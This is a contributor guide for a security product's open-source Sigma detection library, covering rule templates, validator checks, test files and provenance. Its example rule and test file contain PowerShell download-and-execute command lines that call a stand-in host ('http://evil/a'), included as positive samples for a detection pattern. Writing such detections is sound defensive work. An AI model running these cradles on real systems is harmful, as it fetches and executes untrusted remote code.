# Contributing detection content

Cyble AiSOC ships an open-source detection library. The rules live at
[`platform/backend/app/detections/rules/`](backend/app/detections/rules/)
and are written in [Sigma](https://github.com/SigmaHQ/sigma) YAML so
they are portable to Splunk SPL, Microsoft Sentinel KQL, Elastic
Lucene, and Google Chronicle.

This document is the contract for contributing a new rule. Follow it
and your PR will be merged within one business day. CI enforces every
hard rule below — there is no separate review checklist; **the
validator IS the review**.

## TL;DR

1. Drop a YAML file under
   `platform/backend/app/detections/rules/<category>/your-rule.yml`.
2. Optionally drop a sibling `your-rule.tests.yml` with positive and
   negative sample events.
3. Open a PR. CI runs `python scripts/validate_detection.py` on the
   changed files and posts a verdict comment within ~30 seconds.

---

## Hard requirements (CI rejects on failure)

| Code | What we check                                                                                              |
| ---- | ---------------------------------------------------------------------------------------------------------- |
| H1   | Rule has a non-empty, globally unique `id`.                                                                 |
| H2   | Rule has a `title` and a `description` of at least 40 characters.                                          |
| H3   | Rule carries at least one MITRE ATT&CK tag (e.g. `attack.t1003.001` or `attack.credential_access`).        |
| H4   | `status` is one of `stable`, `test`, `experimental`, `deprecated`.                                          |
| H5   | `logsource:` declares at least one of `category`, `product`, or `service`.                                  |
| H6   | If a sibling `<rule>.tests.yml` exists, every entry under `positives:` matches and every entry under `negatives:` does not. |
| H8   | The rule compiles cleanly to **both** Splunk SPL and Microsoft Sentinel KQL (no backend-only syntax).      |

> H7 is intentionally reserved. The "you must declare false positives"
> check ships as the soft warning **S4** today and will be promoted
> to a hard error in v0.2 once we backfill the legacy rule pack.

## Soft warnings (CI surfaces but does not block)

| Code | What we suggest                                                                                  |
| ---- | ------------------------------------------------------------------------------------------------ |
| S1   | Set `level:` (`low` / `medium` / `high` / `critical`).                                            |
| S2   | Set `author:` to your name + GitHub handle, e.g. `Jane Doe (github:janedoe)`.                    |
| S3   | Add at least one `aisoc.<vertical>` tag so the rule is routable to a public pack.                |
| S4   | Provide a `falsepositives:` list (use `- none expected` if you genuinely don't expect any FPs).  |

---

## Rule template

```yaml
title: Short Imperative Title (Subject Verb Object)
id: aisoc-<2-letter-category>-<4-digit-seq>-<short-slug>
status: experimental         # stable | test | experimental | deprecated
description: |
  Two or three sentences. What does this detect? Why does it matter?
  When do you expect it to fire? Aim for ~40+ characters; avoid
  marketing language.
author: Your Name (github:yourhandle)
level: medium
logsource:
  category: process_creation
  product: windows
tags:
  - attack.t1059.001            # MITRE ATT&CK technique (required)
  - attack.execution            # MITRE tactic (recommended)
  - aisoc.endpoint              # vertical/pack tag (recommended)
detection:
  selection:
    process.name: powershell.exe
    process.command_line|contains:
      - 'IEX'
      - 'DownloadString'
  condition: selection
falsepositives:
  - Patch-management tools that legitimately fetch remote scripts
  - Internal devops/automation that uses IEX
```

## Tests file (optional but strongly recommended)

If you ship `<rule>.yml`, drop `<rule>.tests.yml` next to it:

```yaml
positives:
  - process.name: powershell.exe
    process.command_line: "IEX (New-Object Net.WebClient).DownloadString('http://evil/a')"
  - process.name: powershell.exe
    process.command_line: "IEX (iwr 'http://evil/x').Content"

negatives:
  - process.name: powershell.exe
    process.command_line: "Get-Process"
  - process.name: notepad.exe
    process.command_line: "IEX 'foo'"
```

The validator loads each entry, evaluates your rule against it, and
fails the PR if a positive does not match or a negative does match.
This is the single best signal of rule quality in CI — please write
at least two positives and two negatives if you can.

---

## Provenance

When your rule is loaded, the catalog stamps a `provenance` block:

- `source`: `cyble-native` if `author == "Cyble AiSOC"`, `mirrored` if
  the rule id begins with `sigma-` / `elastic-` / `splunk-`,
  otherwise `community`.
- `contributor`: parsed from your `author:` field if it includes a
  GitHub handle (`Name (github:handle)` or `Name <handle@gh>`).

Provenance is visible at `GET /detections/catalog` and on the public
detections page on tryaisoc.com. We never strip your handle — it is
the canonical way to credit community contributions.

---

## Running the validator locally

```bash
cd platform/backend
python scripts/validate_detection.py app/detections/rules/endpoint/your-new-rule.yml
```

You can also POST a YAML blob to the live API:

```bash
curl -s -X POST http://localhost:8478/detections/validate \
  -H 'Content-Type: application/json' \
  -d "$(jq -Rs '{yaml: ., name: "your-rule.yml"}' < your-rule.yml)"
```

Both surfaces share the same `app.detections.contrib.validate_rule`
implementation — there is one validator. Drift between local CLI and
the live API is a bug; please file one.

---

## Code of conduct & licensing

By contributing you agree that:

1. Your rule is licensed under the same Apache-2.0 license as the
   rest of the AiSOC repository.
2. You have the right to contribute it (no proprietary internal
   playbooks or NDA-covered logic).
3. The rule's intent is *defensive*. We do not accept offensive
   tradecraft, exploit code, or rules whose primary purpose is to
   evade other defenders.
